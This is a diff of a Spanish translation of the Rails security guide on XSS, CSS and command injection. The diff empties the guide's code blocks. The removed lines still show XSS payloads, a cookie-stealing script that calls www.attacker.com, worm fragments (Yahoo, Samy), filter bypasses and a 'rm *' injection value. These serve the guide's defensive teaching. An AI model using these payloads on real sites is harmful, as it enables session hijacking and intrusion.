@@ -122,34 +122,33 @@ El lenguaje XSS más común es, por supuesto, JavaScript el más popular del len
 Aquí está la prueba más directa para comprobar XSS:
 
 ```js
-<script>alert('Hello');</script>
+
 ```
 
 Este código JavaScript simplemente mostrará un cuadro de alerta. Los siguientes ejemplos hacen exactamente lo mismo, sólo que en lugares muy poco comunes:
 
 ```js
-<img src=javascript:alert('Hello')>
-<table background="javascript:alert('Hello')">
+
 ```
 
 ##### 7.3.2.1 Robo de Cookie
 
-Estos ejemplos no causan ningún daño hasta ahora, así que veamos cómo un atacante puede robar la cookie del usuario \(y así secuestrar la sesión del usuario\). En JavaScript puede utilizar la propiedad `document.cookie` para leer y escribir la cookie del documento. JavaScript aplica la misma política de origen, lo que significa que un script de un dominio no puede acceder a las cookies de otro dominio. La propiedad `document.cookie`contiene la cookie del servidor web de origen. Sin embargo, puede leer y escribir esta propiedad si inserta el código directamente en el documento HTML \(como sucede con XSS\). Inyecte esto en cualquier parte de su aplicación web para ver su propia cookie en la página de resultados:
+Estos ejemplos no causan ningún daño hasta ahora, así que veamos cómo un atacante puede robar la cookie del usuario \(y así secuestrar la sesión del usuario\). En JavaScript puede utilizar la propiedad `document.cookie` para leer y escribir la cookie del documento. JavaScript aplica la misma política de origen, lo que significa que un script de un dominio no puede acceder a las cookies de otro dominio. La propiedad `document.cookie`contiene la cookie del servidor web de origen. Sin embargo, puede leer y escribir esta propiedad si inserta el código directamente en el documento HTML \(como sucede con XSS\). Inyecte esto en cualquier parte de su aplicación web para ver su propia cookie en la página de resultados:
 
 ```js
-<script>document.write(document.cookie);</script>
+
 ```
 
-Para un atacante, por supuesto, esto no es útil, ya que la víctima verá su propia cookie. El siguiente ejemplo intentará cargar una imagen desde la URL [`http://www.attacker.com/`](http://www.attacker.com/)además de la cookie. Por supuesto, esta URL no existe, por lo que el navegador no muestra nada. Pero el atacante puede revisar los archivos de registro de acceso de su servidor web para ver la cookie de la víctima.
+Para un atacante, por supuesto, esto no es útil, ya que la víctima verá su propia cookie. El siguiente ejemplo intentará cargar una imagen desde la URL [`http://www.attacker.com/`](http://www.attacker.com/)además de la cookie. Por supuesto, esta URL no existe, por lo que el navegador no muestra nada. Pero el atacante puede revisar los archivos de registro de acceso de su servidor web para ver la cookie de la víctima.
 
 ```js
-<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+
 ```
 
-Los archivos de logs en [`www.attacker.com`](http://www.attacker.com/)se leerán así:
+Los archivos de logs en [`www.attacker.com`](http://www.attacker.com/)se leerán así:
 
 ```ruby
-GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
+
 ```
 
 Usted puede mitigar estos ataques \(de la manera obvia\) agregando la flag de httpOnly a las cookies, de modo que document.cookie no pueda ser leído por el Javascript. Sólo se pueden utilizar cookies HTTP de IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 y Chrome 1.0.154. Pero otros navegadores antiguos \(como WebTV e IE 5.5 en Mac\) pueden causar que la página no se cargue. Sin embargo, tenga en cuenta que las cookies seguirán siendo visibles usando Ajax.
@@ -159,18 +158,17 @@ Usted puede mitigar estos ataques \(de la manera obvia\) agregando la flag de ht
 Con la degradación de páginas web, un atacante puede hacer muchas cosas, por ejemplo, presentar información falsa o atraer a la víctima en el sitio web de los atacantes para robar la cookie, credenciales de inicio de sesión u otros datos confidenciales. La forma más popular es incluir código de fuentes externas por iframes:
 
 ```js
-<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
+
 ```
 
-Esto carga HTML y/o JavaScript arbitrario de una fuente externa y lo incrusta como parte del sitio. Este iframe se toma de un ataque real a sitios italianos legítimos usando el marco de ataque de [Mpack](https://www.gitbook.com/book/danielmoralesp/guias-de-rails-espanol/edit#). Mpack intenta instalar software malicioso a través de agujeros de seguridad en el navegador web - con mucho éxito, el 50% de los ataques tienen éxito.
+Esto carga HTML y/o JavaScript arbitrario de una fuente externa y lo incrusta como parte del sitio. Este iframe se toma de un ataque real a sitios italianos legítimos usando el marco de ataque de [Mpack](https://www.gitbook.com/book/danielmoralesp/guias-de-rails-espanol/edit#). Mpack intenta instalar software malicioso a través de agujeros de seguridad en el navegador web - con mucho éxito, el 50% de los ataques tienen éxito.
 
 Un ataque más especializado podría superponerse a todo el sitio web o mostrar un formulario de inicio de sesión, que se ve igual al original del sitio, pero transmite el nombre de usuario y la contraseña al sitio del atacante. O puede usar CSS y/o JavaScript para ocultar un enlace legítimo en la aplicación web y mostrar otro en su lugar que redirige a un sitio web falso.
 
 Los ataques de inyección reflejados son aquellos en los que la carga útil no se almacena para presentarla a la víctima posteriormente, pero se incluye en la URL. Especialmente los formularios de búsqueda no pueden escapar de la cadena de búsqueda. El siguiente enlace presentaba una página en la que se decía que "George Bush designó a un niño de 9 años para que fuera el presidente ...":
 
 ```js
-http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
-  <script src=http://www.securitylab.ru/test/sc.js></script><!--
+
 ```
 
 ##### 7.3.2.3 Contramedidas
@@ -179,33 +177,31 @@ Es muy importante filtrar entradas maliciosas, pero también es importante escap
 
 Especialmente para XSS, es importante hacer filtrado de entrada de lista blanca en lugar de lista negra. El filtrado de listas blancas indica los valores permitidos en oposición a los valores no permitidos. Las listas negras nunca están completas.
 
-Imagine que una lista negra elimina "script" de la entrada del usuario. Ahora el atacante inyecta "&lt;scrscriptipt&gt;", y después del filtro, "&lt;script&gt;" permanece. Las versiones anteriores de Rails utilizaron un enfoque de lista negra para el método `strip_tags()`, `strip_links()` y `sanitize()`. Así que este tipo de inyección era posible:
+Imagine que una lista negra elimina "script" de la entrada del usuario. Ahora el atacante inyecta "&lt;scrscriptipt&gt;", y después del filtro, "&lt;script&gt;" permanece. Las versiones anteriores de Rails utilizaron un enfoque de lista negra para el método `strip_tags()`, `strip_links()` y `sanitize()`. Así que este tipo de inyección era posible:
 
 ```js
-strip_tags("some<<b>script>alert('hello')<</b>/script>")
+
 ```
 
-Esto devolvió "algunos`<script>alert ('hello')</ script>`", lo que hace que un ataque funcione. Es por eso que un enfoque de lista blanca es mejor, utilizando el método actualizado de Rails 2 `sanitize()`:
+Esto devolvió "algunos`<script>alert ('hello')</ script>`", lo que hace que un ataque funcione. Es por eso que un enfoque de lista blanca es mejor, utilizando el método actualizado de Rails 2 `sanitize()`:
 
 ```ruby
-tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
-s = sanitize(user_input, tags: tags, attributes: %w(href title))
+
 ```
 
 Esto permite sólo las etiquetas dadas y hace un buen trabajo, incluso contra todo tipo de trucos y etiquetas mal formadas.
 
-Como segundo paso, es una buena práctica escapar de toda la salida de la aplicación, especialmente cuando vuelve a mostrar la entrada del usuario, que no ha sido filtrada por el input \(como en el ejemplo del formulario de búsqueda anterior\). Utilice el método `escapeHTML()` o su método alias `h()` para reemplazar los caracteres de entrada HTML &, ", &lt;y&gt; por sus representaciones no interpretadas en HTML \(`&amp;, &quot;, &lt;, and &gt;`\).
+Como segundo paso, es una buena práctica escapar de toda la salida de la aplicación, especialmente cuando vuelve a mostrar la entrada del usuario, que no ha sido filtrada por el input \(como en el ejemplo del formulario de búsqueda anterior\). Utilice el método `escapeHTML()` o su método alias `h()` para reemplazar los caracteres de entrada HTML &, ", &lt;y&gt; por sus representaciones no interpretadas en HTML \(`&amp;, &quot;, &lt;, and &gt;`\).
 
 ##### 7.3.2.4 Ofuscación y codificación de la inyección
 
 El tráfico de la red se basa sobre todo en el alfabeto occidental limitado, así que las nuevas codificaciones de carácter, tales como Unicode, emergieron, para transmitir caracteres en otros idiomas. Sin embargo, esto también es una amenaza para las aplicaciones web, ya que el código malicioso se puede ocultar en diferentes codificaciones que el navegador puede procesar, pero la aplicación web no. Aquí está un vector de ataque en codificación UTF-8:
 
 ```js
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
-  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+
 ```
 
-Este ejemplo muestra un cuadro de mensaje. Sin embargo, será reconocido por el filtro `sanitize()` anterior. Una gran herramienta para ofuscar y codificar cadenas, y así "conocer a su enemigo", es el Hackvertor. El método `sanitize()` de Rails hace un buen trabajo para evitar ataques de codificación.
+Este ejemplo muestra un cuadro de mensaje. Sin embargo, será reconocido por el filtro `sanitize()` anterior. Una gran herramienta para ofuscar y codificar cadenas, y así "conocer a su enemigo", es el Hackvertor. El método `sanitize()` de Rails hace un buen trabajo para evitar ataques de codificación.
 
 #### 7.3.3 Ejemplos del Subterráneo
 
@@ -214,9 +210,7 @@ Para entender los ataques de hoy en las aplicaciones web, lo mejor es echar un v
 Lo que sigue es un extracto del Js.Yamanner@m Yahoo! Gusano del correo. Apareció el 11 de junio de 2006 y fue el primer gusano de interfaz webmail:
 
 ```js
-<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
-  target=""onload="var http_request = false;    var Email = '';
-  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
+
 ```
 
 Los gusanos explotan un agujero en el filtro HTML/JavaScript de Yahoo, que usualmente filtra todos los objetivos y atributos de carga de las etiquetas \(porque puede haber JavaScript\). El filtro se aplica sólo una vez, sin embargo, por lo que el atributo onload con el código de gusano permanece en su lugar. Este es un buen ejemplo de por qué los filtros de listas negras nunca son completos y por qué es difícil permitir HTML/JavaScript en una aplicación web.
@@ -234,25 +228,25 @@ La injection de CSS se explica mejor con el conocido gusano Samy de MySpace. Est
 MySpace bloqueó muchas etiquetas, pero permitió CSS. Así el autor del gusano puso JavaScript en un CSS como este:
 
 ```html
-<div style="background:url('javascript:alert(1)')">
+
 ```
 
-Así que la carga útil está en el atributo de estilo. Pero no hay cotizaciones permitidas en la carga útil, ya que las comillas simples y dobles ya se han utilizado. Pero JavaScript tiene una útil función `eval()` que ejecuta cualquier cadena como código.
+Así que la carga útil está en el atributo de estilo. Pero no hay cotizaciones permitidas en la carga útil, ya que las comillas simples y dobles ya se han utilizado. Pero JavaScript tiene una útil función `eval()` que ejecuta cualquier cadena como código.
 
 ```html
-<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
+
 ```
 
-La función `eval()`es una pesadilla para los filtros de entrada de la lista negra, ya que permite que el atributo de estilo oculte la palabra "`innerHTML`":
+La función `eval()`es una pesadilla para los filtros de entrada de la lista negra, ya que permite que el atributo de estilo oculte la palabra "`innerHTML`":
 
 ```js
-alert(eval('document.body.inne' + 'rHTML'));
+
 ```
 
 El siguiente problema para MySpace fue filtrar la palabra "javascript", por lo que el autor utilizó "`java <NEWLINE> script`" para evitar esto:
 
 ```html
-<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
+
 ```
 
 Otro problema para el autor del gusano fueron las fichas de seguridad CSRF. Sin ellos no pudo enviar una solicitud de amistad a través de POST. Lo consiguió enviando un GET a la página justo antes de agregar un usuario y analizar el resultado del token CSRF.
@@ -263,31 +257,28 @@ La propiedad CSS de moz-binding resultó ser otra forma de introducir JavaScript
 
 #### 7.4.1 Contramedidas
 
-Este ejemplo, otra vez, demostró que un filtro de la lista negra nunca esta completo. Sin embargo, como el CSS personalizado en aplicaciones web es una característica bastante rara, puede ser difícil encontrar un buen filtro CSS de lista blanca. Si desea permitir colores o imágenes personalizadas, puede permitir que el usuario las elija y cree el CSS en la aplicación web. Utilice el método `sanitize()` de Rails como modelo para un filtro CSS de lista blanca, si realmente necesita uno.
+Este ejemplo, otra vez, demostró que un filtro de la lista negra nunca esta completo. Sin embargo, como el CSS personalizado en aplicaciones web es una característica bastante rara, puede ser difícil encontrar un buen filtro CSS de lista blanca. Si desea permitir colores o imágenes personalizadas, puede permitir que el usuario las elija y cree el CSS en la aplicación web. Utilice el método `sanitize()` de Rails como modelo para un filtro CSS de lista blanca, si realmente necesita uno.
 
 ### 7.5 Inyección de texto
 
 Si desea proporcionar un formato de texto que no sea HTML \(debido a la seguridad\), utilice un lenguaje de marcado que se convierte en HTML en el lado del servidor. RedCloth es un lenguaje para Ruby, pero sin las debidas precauciones, también es vulnerable a XSS.
 
-Por ejemplo, RedCloth traduce `_test_` a `<em> test <em>`, lo que hace que el texto sea en cursiva. Sin embargo, hasta la versión actual 3.0.4, sigue siendo vulnerable a XSS. Obtenga la nueva versión 4 que eliminó los errores graves. Sin embargo, incluso esa versión tiene algunos errores de seguridad, por lo que las contramedidas siguen aplicándose. Aquí hay un ejemplo para la versión 3.0.4:
+Por ejemplo, RedCloth traduce `_test_` a `<em> test <em>`, lo que hace que el texto sea en cursiva. Sin embargo, hasta la versión actual 3.0.4, sigue siendo vulnerable a XSS. Obtenga la nueva versión 4 que eliminó los errores graves. Sin embargo, incluso esa versión tiene algunos errores de seguridad, por lo que las contramedidas siguen aplicándose. Aquí hay un ejemplo para la versión 3.0.4:
 
 ```ruby
-RedCloth.new('<script>alert(1)</script>').to_html
-# => "<script>alert(1)</script>"
+
 ```
 
-Utilice la opción `:filter_html`para eliminar `HTML`que no fue creado por el procesador Textile.
+Utilice la opción `:filter_html`para eliminar `HTML`que no fue creado por el procesador Textile.
 
 ```ruby
-RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
-# => "alert(1)"
+
 ```
 
-Sin embargo, esto no filtra todo el HTML, se dejarán algunas etiquetas \(por diseño\), por ejemplo `<a>`:
+Sin embargo, esto no filtra todo el HTML, se dejarán algunas etiquetas \(por diseño\), por ejemplo `<a>`:
 
 ```ruby
-RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
-# => "<p><a href="javascript:alert(1)">hello</a></p>"
+
 ```
 
 #### 7.5.1 Contramedidas
@@ -298,20 +289,15 @@ Se recomienda utilizar RedCloth en combinación con un filtro de entrada de list
 
 > Las mismas precauciones de seguridad deben tomarse para las acciones de Ajax como para las "normales". Hay al menos una excepción, sin embargo: La salida tiene que ser escapada en el controlador, si la acción no renderiza una vista.
 
-Si utiliza el complemento `in_place_editor`, o acciones que devuelven una cadena, en lugar de representar una vista, tiene que escapar el valor devuelto en la acción. De lo contrario, si el valor devuelto contiene una cadena XSS, el código malicioso se ejecutará al regresar al navegador. Escapar de cualquier valor de entrada utilizando el método `h()`.
+Si utiliza el complemento `in_place_editor`, o acciones que devuelven una cadena, en lugar de representar una vista, tiene que escapar el valor devuelto en la acción. De lo contrario, si el valor devuelto contiene una cadena XSS, el código malicioso se ejecutará al regresar al navegador. Escapar de cualquier valor de entrada utilizando el método `h()`.
 
 ### 7.7 Inyección de Línea de Comando
 
 > Utilice los parámetros de línea de comandos proporcionados por el usuario con precaución.
 
-Si su aplicación tiene que ejecutar comandos en el sistema operativo subyacente, hay varios métodos en Ruby: `exec(command)`, `syscall(command)`, `system(command)` y `command`. Deberá tener especial cuidado con estas funciones si el usuario puede ingresar el comando completo o una parte del mismo. Esto se debe a que en la mayoría de los shells, puede ejecutar otro comando al final del primero, concatenándolos con un punto y coma \(;\) o una barra vertical \(\|\).
+Si su aplicación tiene que ejecutar comandos en el sistema operativo subyacente, hay varios métodos en Ruby: `exec(command)`, `syscall(command)`, `system(command)` y `command`. Deberá tener especial cuidado con estas funciones si el usuario puede ingresar el comando completo o una parte del mismo. Esto se debe a que en la mayoría de los shells, puede ejecutar otro comando al final del primero, concatenándolos con un punto y coma \(;\) o una barra vertical \(\|\).
 
-Una contramedida es usar el método del `system(command, parameters)` que pasa los parámetros de la línea de comandos de forma segura.
-
-```ruby
-system("/bin/echo","hello; rm *")
-# prints "hello; rm *" and does not delete files
-```
+Una contramedida es usar el método del `system(command, parameters)` que pasa los parámetros de la línea de comandos de forma segura.
 
 ### 7.8 Inyección de cabeceras
 
